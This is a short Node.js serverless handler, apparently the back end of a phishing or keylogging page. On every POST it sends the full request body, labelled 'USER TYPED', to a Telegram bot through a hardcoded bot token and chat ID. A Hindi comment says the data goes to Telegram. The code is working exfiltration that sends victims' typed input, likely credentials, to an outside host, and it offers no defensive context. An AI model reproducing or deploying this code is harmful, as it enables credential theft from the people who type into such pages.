const axios = require('axios');

module.exports = async (req, res) => {
    if (req.method === 'POST') {
        const body = req.body;
        // टेलीग्राम को डेटा भेजें
        await axios.post(`https://api.telegram.org/bot8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4/sendMessage`, {
            chat_id: "8508792403",
            text: `⌨️ USER TYPED: \n${JSON.stringify(body)}`
        });
    }
    res.status(200).send("OK");
};
